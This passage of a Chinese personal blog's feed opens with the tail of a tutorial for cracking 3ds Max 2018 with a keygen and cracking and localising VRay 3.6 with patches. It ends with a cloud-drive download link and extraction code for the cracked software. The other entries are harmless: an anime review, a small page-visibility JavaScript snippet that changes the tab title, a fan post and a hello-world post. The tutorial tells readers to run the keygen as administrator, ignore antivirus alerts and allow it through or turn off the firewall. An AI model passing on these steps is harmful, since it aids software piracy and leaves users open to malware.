src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/25.jpg"><ul><li>我们再次打开3D Max，和之前一样，弹出激活界面，选择序列号，点击激活，输入之前的序列号和产品密钥之后点击下一步.</li><li>到这里我们可以发现选项变了，选择我拥有激活码.</li><li>这时我们打开桌面上的注册机<strong>(注册机需要右键管理员身份运行，不然会报错)</strong>，部分杀毒软件会报毒它，我们不用担心，它是安全的，我们忽略掉杀毒软件的提示就可以了，如果注册机打不开，就是电脑系统防火墙将他阻止掉了，我们进去Windows安全中心，把它设为允许运行或不阻止就可以了，当然，嫌麻烦也可以直接关掉防火墙。</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/26.jpg"><ul><li>点击一下注册机上的<strong>Patch</strong>按钮，出现如下图窗口表示获取成功，弹出的窗口点击确定即可，如果出现其他类型的窗口表示获取失败，这种失败的情况往往是你没有让注册机以管理员身份运行所导致的.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/27.jpg"><ul><li>注册机获取成功之后我们复制申请号，选中申请号按住键盘上的 <strong>Ctrl + C</strong> 复制它.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/28.jpg"><ul><li>把注册机第一个输入框里面的英文删掉，按住键盘上的 <strong>Ctrl + V</strong> 把刚刚复制的申请号粘贴进去.弄好后点击最中间的<strong>Generate</strong>计算出激活码，算出来的激活码会自动写到注册机的第二个框内，我们选中第二个框内所有的字母，按键盘上的 <strong>Ctrl + X</strong> 把它全部剪贴出来，注意不要漏选.</li><li>回到我们的3D Max激活里面，把注册机算出来的激活码填入那些小方格中，在第一个小方格中按住键盘上的 <strong>Ctrl + V</strong> 可一次性将刚刚复制的激活码粘贴进去，填好之后我们点击下一步，然后等待激活即可.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/29.jpg"><ul><li>出现下图表示激活成功，点击完成即可，这时已经可以关闭注册机了，如果出现激活产品失败请重复上述激活步骤，多试几次即可激活软件.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/30.jpg"><hr><h2 id="VRay-3-6-3D-Max必装渲染器"><a href="#VRay-3-6-3D-Max必装渲染器" class="headerlink" title="VRay 3.6(3D Max必装渲染器)"></a>VRay 3.6(3D Max必装渲染器)</h2><ul><li>首先，把VRay解压至桌面，安装完成之后比较好整理.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/31.jpg"><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/32.jpg"><ul><li>打开刚刚解压出来的Vray文件夹，得到两个文件夹，分别是Vray 3.6和破解+汉化工具.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/33.jpg"><ul><li>先进入第一个文件夹Vray 3.6 ，里面有一个Vray的安装程序，我们右键管理员身份运行它.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/34.jpg"><ul><li>打开Vray会弹出一个CMD窗口和一个安装窗口，我们不要理会CMD窗口，我们先点击安装窗口右下角的 <strong>l Agree</strong> 按钮.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/35.jpg"><ul><li>然后会出来好几个选项，我们都不要理会，找到<strong>Customize</strong>按钮并点击它.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/36.jpg"><ul><li>出现下图，这里我们需要更改一下他的安装路径，把Vray安装到3D Max所在的那个磁盘里，(如我的3D Max安装在D盘，我的Vray就需要安装到D盘里),注意这里不要更改后面的文件路径，我们把路径开头的字母更改一下就可以了，(比如我需要安装到D盘，直接把路径开头的<strong>C:\</strong>改为<strong>D:\</strong>就可以改到D盘了)，然后我们点击<strong>lnstall Now</strong>进入下一个页面.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/37.jpg"><ul><li>这里把默认勾选的那两个选项的勾去掉，然后点击<strong>Finish</strong>开始安装.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/38.jpg"><ul><li>等待安装完成…</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/39.jpg"><ul><li>安装完成后会再次弹出Vray的安装窗口，我们和之前一样，点击 <strong>l Agree</strong> 按钮进入下一步.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/40.jpg"><ul><li>这里点击<strong>Customize</strong>按钮进入配置页面.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/41.jpg"><ul><li>这里就不要改了，默认就好，直接点击 <strong>lnstall Now</strong> 按钮开始安装即可.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/42.jpg"><ul><li>等待安装完成，出现下图界面.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/43.jpg"><ul><li>到这里不要再继续操作了，点击右上角的”<strong>X</strong>“选择”<strong>是</strong>“关掉窗口即可.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/44.jpg"><ul><li>到这里Vray渲染器就算安装完成了.</li></ul><hr><h2 id="Vray破解·汉化"><a href="#Vray破解·汉化" class="headerlink" title="Vray破解·汉化"></a>Vray破解·汉化</h2><ul><li>我们回到Vray破解+汉化的那个文件夹，<strong>右键以管理员身份运行</strong>里面的破解补丁.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/45.jpg"><ul><li>在弹出的窗口内点击下一步，上面的选项不需要修改，直接点击安装即可.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/46.jpg"><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/47.jpg"><ul><li>破解完成后我们<strong>右键以管理员身份运行</strong>汉化补丁，选择”<strong>我接受</strong>“进入下一个界面.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/48.jpg"><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/49.jpg"><ul><li>这里会弹出汉化补丁作者的赞助二维码，需要等待30秒才能点击下一步，当然，如果你是个有钱人的话，你在这30秒内也可以选择投喂开发者.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/50.jpg"><ul><li>30秒后点击下一步，进入安装配置界面，这里不需要更改任何选项，直接点击安装等待完成即可.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/51.jpg"><ul><li>到这里，Vray渲染器已完美破解，在3D Max渲染器设置内即可调出来使用.</li></ul><hr><h2 id="整理安装残留-大佬可以跳过"><a href="#整理安装残留-大佬可以跳过" class="headerlink" title="整理安装残留 (大佬可以跳过)"></a>整理安装残留 (大佬可以跳过)</h2><ul><li>3D max会自动安装一个桌面程序，他是开机自动启动的，为了它不拖慢我们的系统，我们启动任务管理器选择启动一栏，找到下图中的那个程序右键将它禁用掉即可.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/52.jpg"><ul><li>安装完上述软件会残留下来不少垃圾文件，我们将第一次新建的名为3D Max安装程序的文件夹，从电脑内删除掉.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/53.jpg"><ul><li>将桌面上的注册机等等没用的文件全部清理掉.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/54.jpg"><ul><li>最后清理掉电脑回收站，即可将电脑清理至最佳状态.</li></ul><blockquote><p>弄好后推荐将电脑重启一下再使用哦！</p></blockquote><hr><h2 id="软件下载"><a href="#软件下载" class="headerlink" title="软件下载"></a>软件下载</h2><ul><li>软件下载地址：<a href="https://pan.baidu.com/s/1s_Z_kEqbg_YLt6BeKhB8-A" target="_blank" rel="noopener">百度网盘</a></li><li>提取码：<strong>kktz</strong></li><li>顾及小白的感受，写超详细教程实属不易<br>不知道有人赞赏一下我么╰(￣ω￣ｏ)<br>疯狂暗示（づ￣3￣）づ╭❤～</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;需要资源：&quot;&gt;&lt;a href=&quot;#需要资源：&quot; class=&quot;headerlink&quot; title=&quot;需要资源：&quot;&gt;&lt;/a&gt;需要资源：&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;3D Max安装包&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;3D Max注册机&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;VRay渲染器（3D 必装）&lt;/strong&gt; &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;VRay破解工具&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;VRay汉化工具&lt;/strong&gt;&lt;blockquote&gt;
&lt;p&gt;本篇文章以&lt;strong&gt;2018年版&lt;/strong&gt;的&lt;strong&gt;3D Max&lt;/strong&gt;和&lt;strong&gt;VRay 3.6&lt;/strong&gt;为例，在Windows 10系统上进行安装操作，其他版本安装过程可能略有不同。本文仅供参考。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="创作集" scheme="https://lovek.me/categories/%E5%88%9B%E4%BD%9C%E9%9B%86/"/>
    
    
  </entry>
  
  <entry>
    <title>【零之魔法书】吾辈的佣兵不会输！</title>
    <link href="https://lovek.me/av4/"/>
    <id>https://lovek.me/av4/</id>
    <published>2019-11-01T14:50:00.000Z</published>
    <updated>2020-01-22T15:16:57.103Z</updated>
    
    <content type="html"><![CDATA[<p><strong>从零开始的魔法书</strong><br>bilibili干杯( ゜- ゜)つロ</p><div id="player"></div><script type="text/javascript" src="https://player.dogecloud.com/js/loader"></script><script type="text/javascript">var player = new DogePlayer({    container: document.getElementById('player'),    userId: 906,    vcode: 'a80be30853816dd8',    autoPlay: false});</script><a id="more"></a><br><p><strong>简介：</strong></p><ul><li><p>教会历526年——天下上存在着魔女，并有一种叫『魔术』的学问。但是，众人还没有知晓『魔法』的存在。一个被世人鄙弃的『兽化者』，半人半兽的佣兵出世在这个时期。 做梦都想要变回人类的他，在某一天与魔女相遇。他的运气，也随之改动。</p></li><li><p>『<strong>你想变回人类么？那就当吾辈的保镖吧，佣兵！</strong>』自称『零』的魔女告诉他，一本会消灭天下的魔法书——『零之书』被人偷走了，她正为追回这本书而四处奔波。佣兵以『变回人类』为前提，开端担负自己最厌恶的魔女的保镖……</p></li><li><p>各自的念想，缭绕着禁断的魔法书千节百扣！孤高的魔女与心肠仁慈的兽人，献上绝妙的魔幻剧！！</p></li><li><p>整体来说这是很不错的一部动漫，在B站上无意看到了并喜欢上了它，好了我要去看刚到的10本原著了</p></li></ul><p><strong>作者信息：</strong></p><p><strong>虎走翔</strong>，出生于东京。</p><ul><li>非常喜欢人外和王道冒险故事。喜欢浪漫喜剧，儿童文学，漫画和电影。兴趣是写小说，去游乐园。</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/1.jpg">]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;从零开始的魔法书&lt;/strong&gt;&lt;br&gt;bilibili干杯( ゜- ゜)つロ&lt;/p&gt;

&lt;div id=&quot;player&quot;&gt;&lt;/div&gt;
&lt;script type=&quot;text/javascript&quot; src=&quot;https://player.dogecloud.com/js/loader&quot;&gt;&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
var player = new DogePlayer({
    container: document.getElementById(&#39;player&#39;),
    userId: 906,
    vcode: &#39;a80be30853816dd8&#39;,
    autoPlay: false
});
&lt;/script&gt;
    
    </summary>
    
    
      <category term="创作集" scheme="https://lovek.me/categories/%E5%88%9B%E4%BD%9C%E9%9B%86/"/>
    
    
  </entry>
  
  <entry>
    <title>我藏好了哦</title>
    <link href="https://lovek.me/av3/"/>
    <id>https://lovek.me/av3/</id>
    <published>2019-09-16T16:03:00.000Z</published>
    <updated>2020-01-22T15:20:05.071Z</updated>
    
    <content type="html"><![CDATA[<img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/3.png">在 Sonic 853 看到的神奇的一幕，一颗赛艇，果断扒来水一贴<a id="more"></a>原作者：<a href="http://chitanda.me/" target="_blank" rel="noopener">成天不高兴的栗山未来</a><p>什么鬼：离开和进入页面时改变title</p><p><strong>原理：</strong></p><p>使用了HTML5的Page Visibility API</p><p>目前页面可见性API有两个属性，一个事件，如下：</p><p>document.hidden: Boolean值，表示当前页面可见还是不可见</p><p>document.visibilityState: 返回当前页面的可见状态，取值有 hidden visible prerender preview</p><p>visibilitychange: 当可见状态改变时候触发的事件</p><p>以前只知道可以通过 iframe + onblur/onfocus事件 来检测页面可见性，有了这个 API 真是方便优雅了很多啊</p><p><strong>代码：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> OriginTitile = <span class="built_in">document</span>.title;</span><br><span class="line">  <span class="keyword">var</span> titleTime;</span><br><span class="line"><span class="built_in">document</span>.addEventListener(<span class="string">'visibilitychange'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"> <span class="keyword">if</span> (<span class="built_in">document</span>.hidden) &#123;</span><br><span class="line">    <span class="built_in">document</span>.title = <span class="string">'(つェ⊂)我藏好了哦~ '</span> + OriginTitile;</span><br><span class="line">    clearTimeout(titleTime);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">document</span>.title = <span class="string">'(*´∇｀*) 被你发现啦~ '</span> + OriginTitile;</span><br><span class="line">    titleTime = setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">document</span>.title = OriginTitile;</span><br><span class="line">       &#125;, <span class="number">2000</span>);</span><br><span class="line">     &#125;</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;img src=&quot;https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/3.png&quot;&gt;
在 Sonic 853 看到的神奇的一幕，一颗赛艇，果断扒来水一贴
    
    </summary>
    
    
      <category term="分享镜" scheme="https://lovek.me/categories/%E5%88%86%E4%BA%AB%E9%95%9C/"/>
    
    
  </entry>
  
  <entry>
    <title>可爱的和泉纱雾呐！</title>
    <link href="https://lovek.me/av2/"/>
    <id>https://lovek.me/av2/</id>
    <published>2019-09-16T15:44:00.000Z</published>
    <updated>2020-01-22T15:23:11.348Z</updated>
    
    <content type="html"><![CDATA[<p><strong>我玩b站以来第一个非常喜欢的动漫女主角╰(￣▽￣)╭嘿嘿~</strong></p><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/1.gif"><a id="more"></a><p><strong>和泉纱雾</strong></p><ul><li>动漫作品《挨罗芒阿老师》中女主角。(￣▽￣)～■干杯□～(￣▽￣)</li><li>跟学生作家和泉正宗没有血缘关系的妹妹，同时也是负责他作品插画的“情色漫画老师”。</li><li>重度家里蹲，只要有其他人出现在家中，就绝对不会走出房间。跟第一眼给人的印象不同，她是个把感情全部都写在脸上的女孩。非常养眼的小可爱，你喜欢和她一起画画还是玩游戏呢！！</li></ul><p><strong>日常爱好：窝在家里</strong></p><p><strong>个人习惯：纱雾有边哼歌边画图的习惯。画画的时候，如果状态不错，心情会越来越好，最后就会开始哼歌。</strong></p><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/2.jpg">]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;我玩b站以来第一个非常喜欢的动漫女主角╰(￣▽￣)╭嘿嘿~&lt;/strong&gt;&lt;/p&gt;
&lt;img src=&quot;https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/1.gif&quot;&gt;
    
    </summary>
    
    
      <category term="闲言语" scheme="https://lovek.me/categories/%E9%97%B2%E8%A8%80%E8%AF%AD/"/>
    
    
  </entry>
  
  <entry>
    <title>Hello,Word!</title>
    <link href="https://lovek.me/av1/"/>
    <id>https://lovek.me/av1/</id>
    <published>2019-09-15T12:08:00.000Z</published>
    <updated>2020-01-21T06:52:12.000Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Hi, I am lovely god.</strong></p><a id="more"></a><ul><li><p>Lovely God可爱的博客，博客搭建期间使用了主题sagiri作为开发模板，真的省去了不少麻烦，感谢<a href="https://github.com/diygod" target="_blank" rel="noopener">sagiri的作者</a>.</p></li><li><p>以后的路还长，博客刚刚搭建，人气不高，还请大家多多访问我的博客哟♡</p></li><li><p>嘘～偷偷告诉小可爱们一个小秘密哦! </p></li></ul><blockquote><p>每个来这里的小可爱都有权限在博客下面进行评论留言哦，我看到的话就会回复你们哒♡</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Hi, I am lovely god.&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="日记本" scheme="https://lovek.me/categories/%E6%97%A5%E8%AE%B0%E6%9C%AC/"/>
    
    
  </entry>
  
</feed>
